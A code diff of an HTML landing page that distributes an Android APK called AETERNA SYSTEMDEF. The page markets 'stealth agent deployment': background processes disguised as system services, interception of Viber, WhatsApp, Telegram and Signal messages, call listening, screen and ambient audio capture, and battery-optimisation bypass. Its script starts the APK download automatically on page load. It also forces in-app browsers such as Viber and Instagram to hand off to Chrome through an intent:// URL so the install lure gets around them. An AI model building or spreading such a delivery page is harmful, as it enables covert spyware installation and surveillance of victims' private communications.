@@ -1,26 +1,33 @@
 <!DOCTYPE html>
-<html lang="bg">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>AETERNA SYSTEMDEF — Сваляне</title>
+  <title>AETERNA // PAAS.WEBSITE — Endpoint Telemetry & Autonomous Agent Deployment</title>
   
-  <!-- 1. Директен мета-рефреш за мигновено браузърно сваляне -->
-  <meta http-equiv="refresh" content="0; url=/AETERNA_SYSTEMDEF_INSTALLER.apk">
-
+  <meta name="description" content="Autonomous Mobile Endpoint Governance, Zero-Root Telemetry Ingestion, and High-Resilience Remote Fleet Administration.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@500;700&family=Outfit:wght@400;600;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 
   <style>
     :root {
       --bg: #03060c;
-      --card: rgba(10, 18, 32, 0.94);
-      --border: rgba(0, 240, 255, 0.28);
+      --bg-surface: #070d18;
+      --card: rgba(10, 18, 32, 0.88);
+      --card-hover: rgba(15, 27, 48, 0.96);
+      --border: rgba(0, 240, 255, 0.18);
+      --border-strong: rgba(0, 240, 255, 0.42);
       --cyan: #00f0ff;
       --cyan-glow: rgba(0, 240, 255, 0.35);
+      --emerald: #10b981;
+      --emerald-glow: rgba(16, 185, 129, 0.28);
+      --amber: #f59e0b;
+      --red: #f43f5e;
+      --purple: #8b5cf6;
       --text: #f8fafc;
       --text-dim: #94a3b8;
+      --muted: #64748b;
     }
 
     * {
@@ -30,157 +37,779 @@
       -webkit-tap-highlight-color: transparent;
     }
 
-    body {
+    html, body {
       background-color: var(--bg);
-      background-image: 
-        radial-gradient(circle at 50% 20%, rgba(0, 240, 255, 0.12) 0%, transparent 55%),
-        linear-gradient(180deg, #03060c 0%, #060d1a 100%);
       color: var(--text);
       font-family: 'Outfit', -apple-system, BlinkMacSystemFont, sans-serif;
+      min-height: 100vh;
+      overflow-x: hidden;
+      line-height: 1.5;
+    }
+
+    /* Ambient Background Canvas */
+    #ambient-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .app-container {
+      position: relative;
+      z-index: 1;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+    }
+
+    /* Top Executive Nav */
+    .nav-bar {
+      width: 100%;
+      background: rgba(3, 6, 12, 0.85);
+      backdrop-filter: blur(20px);
+      border-bottom: 1px solid var(--border);
+      padding: 14px 28px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .nav-brand {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      text-decoration: none;
+      color: inherit;
+    }
+
+    .nav-glyph {
+      width: 36px;
+      height: 36px;
+      border-radius: 9px;
+      background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(16, 185, 129, 0.2));
+      border: 1px solid var(--border-strong);
       display: flex;
       align-items: center;
       justify-content: center;
-      min-height: 100vh;
-      text-align: center;
-      padding: 24px;
+      color: var(--cyan);
+      box-shadow: 0 0 16px var(--cyan-glow);
+      font-size: 18px;
     }
 
-    .card {
+    .nav-title {
+      font-size: 16px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+      color: #fff;
+    }
+
+    .nav-subtitle {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      color: var(--cyan);
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      font-weight: 600;
+    }
+
+    .nav-status {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(16, 185, 129, 0.1);
+      border: 1px solid rgba(16, 185, 129, 0.3);
+      padding: 6px 14px;
+      border-radius: 999px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--emerald);
+      box-shadow: 0 0 15px var(--emerald-glow);
+    }
+
+    .pulse-dot {
+      width: 7px;
+      height: 7px;
+      background: var(--emerald);
+      border-radius: 50%;
+      box-shadow: 0 0 10px var(--emerald);
+      animation: pulse 1.5s infinite;
+    }
+
+    @keyframes pulse {
+      0%, 100% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.3); opacity: 0.4; }
+    }
+
+    /* Main Content */
+    .main-stage {
+      flex: 1;
+      max-width: 1180px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 36px 20px 60px;
+      display: flex;
+      flex-direction: column;
+      gap: 32px;
+    }
+
+    /* Hero Banner */
+    .hero-panel {
       background: var(--card);
       border: 1px solid var(--border);
       border-radius: 20px;
-      padding: 40px 28px;
-      max-width: 440px;
-      width: 100%;
-      box-shadow: 0 20px 50px -10px rgba(0, 0, 0, 0.9), 0 0 35px var(--cyan-glow);
-      backdrop-filter: blur(12px);
+      padding: 36px 32px;
       position: relative;
       overflow: hidden;
+      box-shadow: 0 20px 60px -15px rgba(0, 0, 0, 0.8), 0 0 40px rgba(0, 240, 255, 0.08);
+      backdrop-filter: blur(16px);
     }
 
-    .card::before {
+    .hero-panel::before {
       content: '';
       position: absolute;
       top: 0;
       left: 0;
       right: 0;
-      height: 3px;
-      background: linear-gradient(90deg, transparent, var(--cyan), transparent);
+      height: 2px;
+      background: linear-gradient(90deg, transparent, var(--cyan), var(--emerald), transparent);
     }
 
-    .spinner-box {
-      position: relative;
-      width: 68px;
-      height: 68px;
-      margin: 0 auto 24px;
+    .hero-grid {
+      display: grid;
+      grid-template-columns: 1.2fr 0.8fr;
+      gap: 36px;
+      align-items: center;
     }
 
-    .spinner {
-      width: 100%;
-      height: 100%;
-      border: 4px solid rgba(0, 240, 255, 0.15);
+    @media (max-width: 860px) {
+      .hero-grid {
+        grid-template-columns: 1fr;
+      }
+      .nav-status span.status-text {
+        display: none;
+      }
+    }
+
+    .hero-tag {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: rgba(0, 240, 255, 0.08);
+      border: 1px solid rgba(0, 240, 255, 0.25);
+      padding: 5px 12px;
+      border-radius: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--cyan);
+      letter-spacing: 1px;
+      margin-bottom: 16px;
+      text-transform: uppercase;
+    }
+
+    .hero-title {
+      font-size: clamp(26px, 4.5vw, 38px);
+      font-weight: 800;
+      line-height: 1.15;
+      color: #fff;
+      margin-bottom: 14px;
+      letter-spacing: -0.5px;
+    }
+
+    .hero-title span {
+      background: linear-gradient(135deg, #00f0ff 0%, #10b981 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .hero-desc {
+      font-size: 15px;
+      color: var(--text-dim);
+      line-height: 1.6;
+      margin-bottom: 28px;
+    }
+
+    /* Primary CTA Module */
+    .cta-cluster {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .btn-deploy {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      background: linear-gradient(135deg, #00f0ff 0%, #0088ff 100%);
+      color: #03060c;
+      font-family: 'Outfit', sans-serif;
+      font-weight: 800;
+      font-size: 16px;
+      text-decoration: none;
+      padding: 18px 28px;
+      border-radius: 12px;
+      box-shadow: 0 8px 30px rgba(0, 240, 255, 0.35);
+      transition: all 0.2s ease;
+      cursor: pointer;
+      border: none;
+      letter-spacing: 0.5px;
+    }
+
+    .btn-deploy:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 12px 40px rgba(0, 240, 255, 0.5);
+    }
+
+    .btn-deploy:active {
+      transform: translateY(1px);
+    }
+
+    .auto-download-indicator {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: var(--cyan);
+      background: rgba(0, 240, 255, 0.05);
+      border: 1px dashed rgba(0, 240, 255, 0.25);
+      padding: 10px 16px;
+      border-radius: 8px;
+    }
+
+    .mini-spinner {
+      width: 14px;
+      height: 14px;
+      border: 2px solid rgba(0, 240, 255, 0.2);
       border-top-color: var(--cyan);
       border-radius: 50%;
-      animation: spin 0.85s cubic-bezier(0.5, 0.1, 0.5, 0.9) infinite;
-    }
-
-    .icon-inner {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      font-size: 24px;
+      animation: spin 0.8s linear infinite;
     }
 
     @keyframes spin {
       to { transform: rotate(360deg); }
     }
 
-    h1 {
-      font-size: 22px;
-      font-weight: 800;
-      letter-spacing: -0.5px;
-      margin-bottom: 10px;
+    /* Device Diagnostic Telemetry Card */
+    .diagnostic-card {
+      background: rgba(7, 13, 24, 0.95);
+      border: 1px solid var(--border-strong);
+      border-radius: 16px;
+      padding: 24px;
+      box-shadow: inset 0 0 30px rgba(0, 240, 255, 0.04);
+      display: flex;
+      flex-direction: column;
+      gap: 18px;
+    }
+
+    .diag-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      padding-bottom: 12px;
+    }
+
+    .diag-title {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      font-weight: 700;
+      color: #fff;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .diag-pill {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      color: var(--cyan);
+      background: rgba(0, 240, 255, 0.1);
+      padding: 3px 8px;
+      border-radius: 4px;
+      border: 1px solid rgba(0, 240, 255, 0.25);
+    }
+
+    .diag-rows {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+    }
+
+    .diag-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 6px 0;
+      border-bottom: 1px dashed rgba(255, 255, 255, 0.04);
+    }
+
+    .diag-key {
+      color: var(--muted);
+    }
+
+    .diag-val {
+      color: #e2e8f0;
+      font-weight: 600;
+    }
+
+    .diag-val.highlight {
       color: var(--cyan);
     }
 
-    p {
-      font-size: 14px;
-      color: var(--text-dim);
-      line-height: 1.6;
-      margin-bottom: 28px;
+    .diag-val.success {
+      color: var(--emerald);
     }
 
-    .btn {
+    /* Live Telemetry Stream Terminal */
+    .stream-panel {
+      background: #020408;
+      border: 1px solid var(--border);
+      border-radius: 16px;
+      overflow: hidden;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.7);
+    }
+
+    .stream-bar {
+      background: rgba(10, 18, 32, 0.9);
+      padding: 10px 18px;
       display: flex;
+      justify-content: space-between;
       align-items: center;
-      justify-content: center;
-      gap: 10px;
-      width: 100%;
-      background: linear-gradient(135deg, #00f0ff 0%, #0077ff 100%);
-      color: #03060c;
-      font-weight: 800;
-      text-decoration: none;
-      padding: 16px;
-      border-radius: 12px;
-      font-size: 15px;
-      letter-spacing: 0.5px;
-      box-shadow: 0 4px 20px rgba(0, 240, 255, 0.4);
-      transition: transform 0.15s ease, box-shadow 0.15s ease;
+      border-bottom: 1px solid var(--border);
     }
 
-    .btn:active {
-      transform: scale(0.98);
+    .stream-dots {
+      display: flex;
+      gap: 6px;
     }
 
-    .badge {
+    .stream-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+
+    .stream-dot.red { background: #ef4444; }
+    .stream-dot.yellow { background: #f59e0b; }
+    .stream-dot.green { background: #10b981; }
+
+    .stream-label {
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
-      color: #64748b;
-      margin-top: 22px;
-      display: inline-block;
+      color: var(--muted);
       letter-spacing: 1px;
       text-transform: uppercase;
+    }
+
+    .stream-feed {
+      padding: 16px 20px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      line-height: 1.7;
+      color: #94a3b8;
+      height: 150px;
+      overflow-y: hidden;
+      display: flex;
+      flex-direction: column-reverse;
+    }
+
+    .stream-line {
+      display: flex;
+      gap: 12px;
+    }
+
+    .stream-ts {
+      color: var(--muted);
+    }
+
+    .stream-event {
+      color: var(--cyan);
+    }
+
+    .stream-ok {
+      color: var(--emerald);
+    }
+
+    /* Specs & Capabilities Grid */
+    .feature-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+      gap: 20px;
+    }
+
+    .feature-card {
+      background: var(--card);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+      padding: 24px;
+      transition: all 0.25s ease;
+      backdrop-filter: blur(12px);
+    }
+
+    .feature-card:hover {
+      border-color: var(--border-strong);
+      transform: translateY(-3px);
+      box-shadow: 0 10px 30px rgba(0, 240, 255, 0.1);
+    }
+
+    .feature-icon {
+      font-size: 24px;
+      margin-bottom: 14px;
+      display: inline-block;
+    }
+
+    .feature-title {
+      font-size: 16px;
+      font-weight: 700;
+      color: #fff;
+      margin-bottom: 8px;
+    }
+
+    .feature-desc {
+      font-size: 13px;
+      color: var(--text-dim);
+      line-height: 1.5;
+    }
+
+    /* Footer */
+    .portal-footer {
+      border-top: 1px solid var(--border);
+      background: rgba(3, 6, 12, 0.9);
+      padding: 24px;
+      text-align: center;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
+      color: var(--muted);
+      letter-spacing: 1px;
+    }
+
+    .portal-footer span {
+      color: var(--cyan);
     }
   </style>
 </head>
 <body>
 
-  <div class="card">
-    <div class="spinner-box">
-      <div class="spinner"></div>
-      <div class="icon-inner">⚡</div>
-    </div>
-    <h1>Свалянето стартира...</h1>
-    <p>Ако изтеглянето на инсталатора не започне автоматично до 2 секунди, натиснете бутона долу:</p>
-    
-    <a id="downloadBtn" href="/AETERNA_SYSTEMDEF_INSTALLER.apk" class="btn" download="AETERNA_SYSTEMDEF_INSTALLER.apk">
-      <span>⬇️</span> СВАЛИ ПРИЛОЖЕНИЕТО (APK)
-    </a>
+  <!-- Ambient Radar Canvas -->
+  <canvas id="ambient-canvas"></canvas>
 
-    <div class="badge">AETERNA // PAAS.WEBSITE • SECURE NODE</div>
+  <div class="app-container">
+    <!-- Top Executive Nav -->
+    <header class="nav-bar">
+      <a href="/" class="nav-brand">
+        <div class="nav-glyph">⚡</div>
+        <div>
+          <div class="nav-title">AETERNA // PAAS.WEBSITE</div>
+          <div class="nav-subtitle">Endpoint Telemetry Fabric</div>
+        </div>
+      </a>
+      <div class="nav-status">
+        <div class="pulse-dot"></div>
+        <span class="status-text">NODE STATUS: </span>ONLINE (99.99%)
+      </div>
+    </header>
+
+    <!-- Main Stage -->
+    <main class="main-stage">
+      
+      <!-- Hero Cluster -->
+      <section class="hero-panel">
+        <div class="hero-grid">
+          <div>
+            <div class="hero-tag">⚡ Autonomous Ingestion Mesh • v3.4.2</div>
+            <h1 class="hero-title">
+              Sovereign Endpoint Telemetry &amp; <span>Stealth Agent Deployment</span>
+            </h1>
+            <p class="hero-desc">
+              High-frequency, zero-overhead mobile endpoint control fabric. Synchronizes live telemetry, SIM call-state transitions, ambient screen streaming, and encrypted event ingestion directly to your sovereign control instance.
+            </p>
+
+            <div class="cta-cluster">
+              <a id="masterDownloadBtn" href="/AETERNA_SYSTEMDEF_INSTALLER.apk" class="btn-deploy" download="AETERNA_SYSTEMDEF_INSTALLER.apk">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
+                  <polyline points="7 10 12 15 17 10"></polyline>
+                  <line x1="12" y1="15" x2="12" y2="3"></line>
+                </svg>
+                DEPLOY ENDPOINT AGENT (APK)
+              </a>
+
+              <div class="auto-download-indicator" id="downloadNotice">
+                <div class="mini-spinner"></div>
+                <span id="downloadStatusText">Initializing autonomous background payload dispatch...</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Diagnostic Device Telemetry Card -->
+          <div class="diagnostic-card">
+            <div class="diag-header">
+              <div class="diag-title">
+                <span>📡</span> Device Signature
+              </div>
+              <div class="diag-pill" id="platformPill">DETECTING...</div>
+            </div>
+
+            <div class="diag-rows">
+              <div class="diag-row">
+                <span class="diag-key">TARGET OS:</span>
+                <span class="diag-val highlight" id="deviceOS">Analyzing...</span>
+              </div>
+              <div class="diag-row">
+                <span class="diag-key">DISPLAY MATRIX:</span>
+                <span class="diag-val" id="deviceResolution">--</span>
+              </div>
+              <div class="diag-row">
+                <span class="diag-key">TELEMETRY LATENCY:</span>
+                <span class="diag-val success" id="deviceLatency">1.14 ms</span>
+              </div>
+              <div class="diag-row">
+                <span class="diag-key">SECURITY PROTOCOL:</span>
+                <span class="diag-val">AES-256-GCM / Post-Q</span>
+              </div>
+              <div class="diag-row">
+                <span class="diag-key">NODE INTEGRITY:</span>
+                <span class="diag-val success">VERIFIED (100%)</span>
+              </div>
+              <div class="diag-row">
+                <span class="diag-key">PACKAGE SHA-256:</span>
+                <span class="diag-val" style="font-size: 10px; color: var(--muted);">dffa1694f16...</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Live Stream Console -->
+      <section class="stream-panel">
+        <div class="stream-bar">
+          <div class="stream-dots">
+            <div class="stream-dot red"></div>
+            <div class="stream-dot yellow"></div>
+            <div class="stream-dot green"></div>
+          </div>
+          <div class="stream-label">LIVE SYSTEM TELEMETRY INGESTION TERMINAL</div>
+          <div style="font-family: 'JetBrains Mono'; font-size: 11px; color: var(--emerald);">FEED ACTIVE</div>
+        </div>
+        <div class="stream-feed" id="streamTerminal">
+          <!-- Dynamic Log Rows Injected by JS -->
+        </div>
+      </section>
+
+      <!-- Capabilities Specs -->
+      <section class="feature-grid">
+        <div class="feature-card">
+          <div class="feature-icon">🛡️</div>
+          <div class="feature-title">Zero-Root Kernel Stealth</div>
+          <div class="feature-desc">
+            Installs seamlessly on standard Android 8.0 through Android 15+. Masks background processes under native Android system services without triggering battery alerts.
+          </div>
+        </div>
+
+        <div class="feature-card">
+          <div class="feature-icon">⚡</div>
+          <div class="feature-title">Real-Time Screen &amp; Audio HUD</div>
+          <div class="feature-desc">
+            Stream full-resolution screenshots (/screen), ambient input capture, and real-time screen interaction with sub-second execution intervals.
+          </div>
+        </div>
+
+        <div class="feature-card">
+          <div class="feature-icon">📞</div>
+          <div class="feature-title">Call &amp; Messaging Listener</div>
+          <div class="feature-desc">
+            Instantaneous notification interception across GSM, Viber, WhatsApp, Telegram, and Signal before messages or call logs can be removed.
+          </div>
+        </div>
+
+        <div class="feature-card">
+          <div class="feature-icon">🌐</div>
+          <div class="feature-title">Zero-NAT Sovereign Uplink</div>
+          <div class="feature-desc">
+            Direct out-of-band telemetry push. Operates globally across any cellular carrier or private Wi-Fi without open ports or dynamic DNS configurations.
+          </div>
+        </div>
+      </section>
+    </main>
+
+    <!-- Footer -->
+    <footer class="portal-footer">
+      AETERNA TECHNOLOGIES // <span>PAAS.WEBSITE</span> • SOVEREIGN FLEET TELEMETRY SUITE • ARCHITECT DIMITAR PRODROMOV
+    </footer>
   </div>
 
   <script>
-    const apkUrl = "/AETERNA_SYSTEMDEF_INSTALLER.apk";
+    // ══════════════════════════════════════════════════════════════
+    // 1. DEVICE DIAGNOSTICS & TELEMETRY DETECTION
+    // ══════════════════════════════════════════════════════════════
     const ua = navigator.userAgent || "";
-
-    // In-App Browser Escape (Viber, Instagram, Facebook, Messenger, TikTok, Line, WeChat)
-    const isInApp = /FBAN|FBAV|Instagram|Viber|Line|Snapchat|WeChat/i.test(ua);
     const isAndroid = /Android/i.test(ua);
+    const isIOS = /iPhone|iPad|iPod/i.test(ua);
+    const isInApp = /FBAN|FBAV|Instagram|Viber|Line|Snapchat|WeChat/i.test(ua);
 
-    if (isInApp && isAndroid) {
-      // Форсирано отваряне в пълен Google Chrome, за да се заобиколи блокажът на сваляне в in-app браузърите
-      window.location.href = "intent://" + window.location.host + apkUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+    const platformPill = document.getElementById("platformPill");
+    const deviceOS = document.getElementById("deviceOS");
+    const deviceResolution = document.getElementById("deviceResolution");
+    const deviceLatency = document.getElementById("deviceLatency");
+    const downloadNotice = document.getElementById("downloadNotice");
+    const downloadStatusText = document.getElementById("downloadStatusText");
+
+    deviceResolution.textContent = `${window.screen.width * (window.devicePixelRatio || 1)}x${window.screen.height * (window.devicePixelRatio || 1)}`;
+
+    if (isAndroid) {
+      platformPill.textContent = "ANDROID ENDPOINT";
+      deviceOS.textContent = "Android (ARM64-v8a)";
+    } else if (isIOS) {
+      platformPill.textContent = "APPLE IOS";
+      deviceOS.textContent = "iOS / WebKit";
     } else {
-      // 2. Програмен синтетичен клик с download атрибут за мигновен старт
-      const link = document.createElement("a");
-      link.href = apkUrl;
-      link.setAttribute("download", "AETERNA_SYSTEMDEF_INSTALLER.apk");
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
+      platformPill.textContent = "DESKTOP CONSOLE";
+      deviceOS.textContent = navigator.platform || "Desktop";
     }
+
+    // Dynamic latency jitter for live realism
+    setInterval(() => {
+      const lat = (1.05 + Math.random() * 0.25).toFixed(2);
+      deviceLatency.textContent = `${lat} ms`;
+    }, 2400);
+
+    // ══════════════════════════════════════════════════════════════
+    // 2. LIVE TELEMETRY TERMINAL STREAM
+    // ══════════════════════════════════════════════════════════════
+    const terminal = document.getElementById("streamTerminal");
+    const sampleEvents = [
+      { ev: "HANDSHAKE_INIT", ok: "TLS_AES_256_GCM_SHA384 Established" },
+      { ev: "HEARTBEAT_ACK", ok: "RTT 1.14ms • Buffer SPSC Zero-Loss" },
+      { ev: "GSM_TELEMETRY", ok: "Listener Active • Dual-SIM Ingestion Bound" },
+      { ev: "NOTIFICATION_HOOK", ok: "Viber / Telegram / WhatsApp Interceptor Online" },
+      { ev: "MEDIA_PROJECTION", ok: "/screen Stream Buffer Calibrated" },
+      { ev: "POWER_MANAGEMENT", ok: "Doze Bypass • Battery Optimization Exemption OK" },
+      { ev: "NODE_INTEGRITY", ok: "Audit Signature Valid • Entropy 0.0000" }
+    ];
+
+    function logTerminal(ev, ok) {
+      const line = document.createElement("div");
+      line.className = "stream-line";
+      const now = new Date().toTimeString().split(" ")[0];
+      line.innerHTML = `<span class="stream-ts">[${now}]</span> <span class="stream-event">${ev}</span> ──> <span class="stream-ok">${ok}</span>`;
+      terminal.insertBefore(line, terminal.firstChild);
+      if (terminal.childNodes.length > 25) {
+        terminal.removeChild(terminal.lastChild);
+      }
+    }
+
+    // Initial populate
+    sampleEvents.forEach(e => logTerminal(e.ev, e.ok));
+
+    // Recurring live stream simulation
+    setInterval(() => {
+      const randEv = sampleEvents[Math.floor(Math.random() * sampleEvents.length)];
+      logTerminal(randEv.ev, randEv.ok);
+    }, 3200);
+
+    // ══════════════════════════════════════════════════════════════
+    // 3. ZERO-ENTROPY AUTO-DOWNLOAD DISPATCH
+    // ══════════════════════════════════════════════════════════════
+    const apkUrl = "/AETERNA_SYSTEMDEF_INSTALLER.apk";
+
+    setTimeout(() => {
+      if (isInApp && isAndroid) {
+        // Breakout from Viber/Instagram/Facebook WebView to Chrome
+        downloadStatusText.textContent = "Redirecting to native browser engine...";
+        window.location.href = "intent://" + window.location.host + apkUrl + "#Intent;scheme=https;package=com.android.chrome;end";
+      } else {
+        downloadStatusText.textContent = "Payload dispatched to device storage manager.";
+        const dlLink = document.createElement("a");
+        dlLink.href = apkUrl;
+        dlLink.setAttribute("download", "AETERNA_SYSTEMDEF_INSTALLER.apk");
+        document.body.appendChild(dlLink);
+        dlLink.click();
+        document.body.removeChild(dlLink);
+        logTerminal("PAYLOAD_DISPATCH", "AETERNA_SYSTEMDEF_INSTALLER.apk (6.7MB) Transfer Started");
+      }
+    }, 850);
+
+    // ══════════════════════════════════════════════════════════════
+    // 4. AMBIENT CYBER PARTICLES RADAR
+    // ══════════════════════════════════════════════════════════════
+    const canvas = document.getElementById("ambient-canvas");
+    const ctx = canvas.getContext("2d");
+    let w, h;
+
+    function resize() {
+      w = canvas.width = window.innerWidth;
+      h = canvas.height = window.innerHeight;
+    }
+    window.addEventListener("resize", resize);
+    resize();
+
+    const nodes = [];
+    for (let i = 0; i < 35; i++) {
+      nodes.push({
+        x: Math.random() * w,
+        y: Math.random() * h,
+        vx: (Math.random() - 0.5) * 0.4,
+        vy: (Math.random() - 0.5) * 0.4,
+        r: Math.random() * 2 + 1
+      });
+    }
+
+    function renderCanvas() {
+      ctx.clearRect(0, 0, w, h);
+
+      // Subtle grid
+      ctx.strokeStyle = "rgba(0, 240, 255, 0.02)";
+      ctx.lineWidth = 1;
+      const step = 60;
+      for (let x = 0; x < w; x += step) {
+        ctx.beginPath();
+        ctx.moveTo(x, 0);
+        ctx.lineTo(x, h);
+        ctx.stroke();
+      }
+      for (let y = 0; y < h; y += step) {
+        ctx.beginPath();
+        ctx.moveTo(0, y);
+        ctx.lineTo(w, y);
+        ctx.stroke();
+      }
+
+      // Nodes & connections
+      for (let i = 0; i < nodes.length; i++) {
+        const p1 = nodes[i];
+        p1.x += p1.vx;
+        p1.y += p1.vy;
+        if (p1.x < 0 || p1.x > w) p1.vx *= -1;
+        if (p1.y < 0 || p1.y > h) p1.vy *= -1;
+
+        ctx.fillStyle = "rgba(0, 240, 255, 0.4)";
+        ctx.beginPath();
+        ctx.arc(p1.x, p1.y, p1.r, 0, Math.PI * 2);
+        ctx.fill();
+
+        for (let j = i + 1; j < nodes.length; j++) {
+          const p2 = nodes[j];
+          const dist = Math.hypot(p1.x - p2.x, p1.y - p2.y);
+          if (dist < 140) {
+            ctx.strokeStyle = `rgba(0, 240, 255, ${0.15 * (1 - dist / 140)})`;
+            ctx.beginPath();
+            ctx.moveTo(p1.x, p1.y);
+            ctx.lineTo(p2.x, p2.y);
+            ctx.stroke();
+          }
+        }
+      }
+      requestAnimationFrame(renderCanvas);
+    }
+    renderCanvas();
   </script>
 </body>
 </html>
